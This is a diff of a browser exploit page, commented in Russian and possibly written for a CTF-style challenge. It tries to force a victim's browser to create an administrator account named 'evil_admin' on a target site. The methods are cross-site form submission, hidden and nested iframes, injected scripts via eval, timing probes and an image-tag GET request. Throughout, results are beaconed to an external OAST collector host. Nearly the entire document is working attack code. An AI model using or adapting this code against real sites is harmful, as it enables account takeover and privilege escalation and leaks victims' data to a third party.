@@ -12,166 +12,252 @@ const ADMIN = "evil_admin";
 
 const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
 
-const attackWindow = window.open(TARGET + "/admin", "attackWindow");
-let attackCompleted = false;
-
-setTimeout(() => {
-    const form = document.createElement("form");
-    form.method = "POST";
-    form.action = TARGET + "/create_admin";
-    form.target = "attackWindow";
-    
-    const input = document.createElement("input");
-    input.name = "new_admin_login";
-    input.value = ADMIN;
-    
-    form.appendChild(input);
-    document.body.appendChild(form);
-    form.submit();
-    
-    log("form_submitted=true");
-    attackCompleted = true;
-}, 1000);
-
-setTimeout(() => {
-    log("window_closed=" + attackWindow.closed);
-}, 2000);
-
-setTimeout(() => {
-    let name = "blocked";
-    try {
-        name = attackWindow.name;
-    } catch(e) {}
-    log("window_name=" + name);
-}, 2500);
-
-setTimeout(() => {
-    const start = performance.now();
-    let title = "x-origin";
-    try {
-        title = attackWindow.document.title;
-    } catch(e) {}
-    log("title=" + title + "|time=" + (performance.now() - start));
-}, 3000);
-
-setTimeout(() => {
-    try {
-        log("location=" + attackWindow.location.href);
-    } catch(e) {
-        log("location=blocked");
-    }
-}, 4000);
-
-const timingAttack = () => {
-    const start = performance.now();
-    fetch(TARGET + "/create_admin", {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'new_admin_login=' + ADMIN
-    }).finally(() => {
-        log("fetch_time=" + (performance.now() - start));
-    });
-};
-
-setTimeout(timingAttack, 3500);
-
+// Основная стратегия: создаем iframe, который загружает страницу админа
+// и отправляет форму ИЗНУТРИ iframe (чтобы куки были)
 const iframe = document.createElement('iframe');
 iframe.style.display = 'none';
-iframe.id = 'leakFrame';
+iframe.name = 'attackFrame';
+
+// 1. Сначала загружаем страницу админа в iframe
+iframe.src = TARGET + "/admin";
 document.body.appendChild(iframe);
 
-iframe.onload = () => {
-    const formHtml = `
-        <form id="expForm" method="POST" action="/create_admin">
-            <input type="hidden" name="new_admin_login" value="${ADMIN}">
-        </form>
-        <script>
-            document.getElementById('expForm').submit();
-            setTimeout(() => {
-                try {
-                    parent.postMessage({type: 'location', href: location.href}, '*');
-                } catch(e) {
-                    parent.postMessage({type: 'error', error: 'cross-origin'}, '*');
-                }
-            }, 1500);
-        <\/script>
-    `;
+iframe.onload = function() {
+    log("iframe_admin_loaded");
     
-    try {
-        iframe.contentDocument.write(formHtml);
-    } catch(e) {
-        log("iframe_write_error=" + e.message);
-    }
-};
-
-setTimeout(() => {
-    iframe.src = TARGET + "/admin";
-}, 500);
-
-window.addEventListener('message', (event) => {
-    if (event.data.type === 'error') {
-        log("iframe_error=" + event.data.error);
-    } else if (event.data.type === 'location') {
-        log("iframe_location=" + event.data.href);
-    }
-});
-
-const imgLeak = () => {
-    const img = new Image();
-    img.onerror = () => log("img_error=true");
-    img.onload = () => log("img_loaded=true");
-    img.src = TARGET + "/admin?cache=" + Date.now();
-};
-
-setTimeout(imgLeak, 4500);
-
-const checkRedirectChain = () => {
-    const redirectWindow = window.open('', 'redirectWindow');
-    const form = document.createElement('form');
-    form.method = 'GET';
-    form.action = TARGET + "/create_admin";
-    form.target = 'redirectWindow';
-    form.innerHTML = `<input type="hidden" name="new_admin_login" value="${ADMIN}">`;
-    
-    document.body.appendChild(form);
-    form.submit();
-    
+    // Даем время на полную загрузку
     setTimeout(() => {
         try {
-            log("redirect_location=" + redirectWindow.location.href);
+            // Пытаемся выполнить скрипт внутри iframe
+            const scriptContent = `
+                // Создаем и отправляем форму
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/create_admin';
+                form.style.display = 'none';
+                
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'new_admin_login';
+                input.value = '${ADMIN}';
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                
+                // Отправляем форму
+                form.submit();
+                
+                // После отправки проверяем редирект
+                setTimeout(() => {
+                    // Если мы здесь, возможно редирект не сработал
+                    // Или мы на той же странице с ошибкой
+                    try {
+                        const errorText = document.body.textContent;
+                        if (errorText.includes('401') || errorText.includes('NOT')) {
+                            parent.postMessage('error_401', '*');
+                        } else if (errorText.includes('success') || document.location.pathname !== '/create_admin') {
+                            parent.postMessage('possible_success', '*');
+                        }
+                    } catch(e) {
+                        parent.postMessage('cannot_check', '*');
+                    }
+                }, 1000);
+            `;
+            
+            // Вставляем скрипт в iframe
+            const script = iframe.contentDocument.createElement('script');
+            script.textContent = scriptContent;
+            iframe.contentDocument.head.appendChild(script);
+            
         } catch(e) {
-            log("redirect_blocked=" + e.message);
+            log("iframe_script_error=" + e.message);
         }
-    }, 2000);
-};
-
-setTimeout(checkRedirectChain, 5000);
-
-const historyLengthAttack = () => {
-    const win = window.open(TARGET + "/admin", "historyWin");
-    
-    setTimeout(() => {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = TARGET + "/create_admin";
-        form.target = "historyWin";
-        form.innerHTML = `<input type="hidden" name="new_admin_login" value="${ADMIN}">`;
-        
-        document.body.appendChild(form);
-        form.submit();
-        
-        setTimeout(() => {
-            try {
-                log("history_length=" + win.history.length);
-            } catch(e) {
-                log("history_error=blocked");
-            }
-        }, 1000);
     }, 1000);
 };
 
-setTimeout(historyLengthAttack, 6000);
+// Слушаем сообщения от iframe
+window.addEventListener('message', (event) => {
+    if (event.data === 'error_401') {
+        log("received_401_error");
+    } else if (event.data === 'possible_success') {
+        log("possible_admin_created");
+    } else if (event.data === 'cannot_check') {
+        log("cannot_determine_result");
+    }
+});
+
+// 2. Стратегия с window.open + форма в том же контексте
+setTimeout(() => {
+    const win = window.open('', 'sameOriginWindow');
+    
+    // Создаем форму, которая отправится в новом окне
+    const form = document.createElement('form');
+    form.method = 'GET';
+    form.action = TARGET + "/admin";
+    form.target = 'sameOriginWindow';
+    form.style.display = 'none';
+    document.body.appendChild(form);
+    form.submit();
+    
+    // После загрузки страницы админа, вставляем скрипт
+    setTimeout(() => {
+        try {
+            const attackScript = `
+                // Ждем загрузки
+                setTimeout(() => {
+                    // Создаем форму для создания админа
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = '/create_admin';
+                    form.style.display = 'none';
+                    
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'new_admin_login';
+                    input.value = '${ADMIN}';
+                    
+                    form.appendChild(input);
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                    // Проверяем результат через 2 секунды
+                    setTimeout(() => {
+                        // Пытаемся определить по URL или содержимому
+                        fetch('${OAST}/leak?d=final_url=' + encodeURIComponent(window.location.href), {mode: 'no-cors'});
+                        
+                        if (document.body.textContent.includes('401')) {
+                            fetch('${OAST}/leak?d=got_401_again', {mode: 'no-cors'});
+                        }
+                    }, 2000);
+                }, 1000);
+            `;
+            
+            win.eval(attackScript);
+            log("window_eval_executed");
+            
+        } catch(e) {
+            log("window_eval_error=" + e.message);
+        }
+    }, 2000);
+}, 2000);
+
+// 3. Стратегия: цепочка iframe для обхода ограничений
+setTimeout(() => {
+    const chainIframe = document.createElement('iframe');
+    chainIframe.style.display = 'none';
+    chainIframe.srcdoc = `
+        <html>
+        <body>
+        <script>
+            // Загружаем страницу админа
+            const innerFrame = document.createElement('iframe');
+            innerFrame.name = 'inner';
+            innerFrame.src = '${TARGET}/admin';
+            document.body.appendChild(innerFrame);
+            
+            innerFrame.onload = function() {
+                setTimeout(() => {
+                    // Создаем форму в innerFrame
+                    const form = innerFrame.contentDocument.createElement('form');
+                    form.method = 'POST';
+                    form.action = '/create_admin';
+                    form.target = '_self';
+                    
+                    const input = innerFrame.contentDocument.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'new_admin_login';
+                    input.value = '${ADMIN}';
+                    
+                    form.appendChild(input);
+                    innerFrame.contentDocument.body.appendChild(form);
+                    form.submit();
+                    
+                    // Проверяем изменение
+                    setTimeout(() => {
+                        try {
+                            // Если URL изменился, значит был редирект (возможно успех)
+                            if (innerFrame.contentWindow.location.href !== '${TARGET}/admin') {
+                                fetch('${OAST}/leak?d=iframe_redirect_detected', {mode: 'no-cors'});
+                            }
+                        } catch(e) {
+                            // cross-origin ошибка - тоже может означать редирект!
+                            fetch('${OAST}/leak?d=cross_origin_after_submit', {mode: 'no-cors'});
+                        }
+                    }, 1500);
+                }, 1000);
+            };
+        <\\/script>
+        </body>
+        </html>
+    `;
+    
+    document.body.appendChild(chainIframe);
+    log("chain_iframe_created");
+}, 4000);
+
+// 4. Проверка через timing атаку на статус страницы
+setTimeout(() => {
+    const start = performance.now();
+    
+    // Создаем скрытое окно/iframe для timing attack
+    const timingFrame = document.createElement('iframe');
+    timingFrame.style.display = 'none';
+    timingFrame.src = TARGET + "/admin?cache=" + Date.now();
+    
+    timingFrame.onload = () => {
+        const loadTime = performance.now() - start;
+        log("admin_page_load_time=" + loadTime);
+        
+        // Если страница загружается быстро, возможно это ошибка 401
+        // Если медленно, возможно это полноценная страница админа с формой
+        if (loadTime < 50) {
+            log("fast_load_possible_error");
+        } else {
+            log("slow_load_possible_admin_page");
+            
+            // Пробуем отправить форму из этого iframe
+            setTimeout(() => {
+                try {
+                    const form = timingFrame.contentDocument.createElement('form');
+                    form.method = 'POST';
+                    form.action = '/create_admin';
+                    
+                    const input = timingFrame.contentDocument.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'new_admin_login';
+                    input.value = ADMIN;
+                    
+                    form.appendChild(input);
+                    timingFrame.contentDocument.body.appendChild(form);
+                    form.submit();
+                    
+                    log("form_submitted_from_timing_frame");
+                } catch(e) {
+                    log("timing_frame_form_error=" + e.message);
+                }
+            }, 500);
+        }
+    };
+    
+    document.body.appendChild(timingFrame);
+}, 6000);
+
+// 5. Финальная проверка через image tag (может работать с куками)
+setTimeout(() => {
+    // Пробуем создать админа через GET запрос (если поддерживается)
+    const img = new Image();
+    
+    img.onerror = function() {
+        log("get_request_failed_or_redirected");
+    };
+    
+    img.onload = function() {
+        log("get_request_success_possible");
+    };
+    
+    // Некоторые сервера могут принимать GET для создания
+    img.src = TARGET + "/create_admin?new_admin_login=" + ADMIN + "&t=" + Date.now();
+}, 8000);
 </script>
 </body>
 </html>
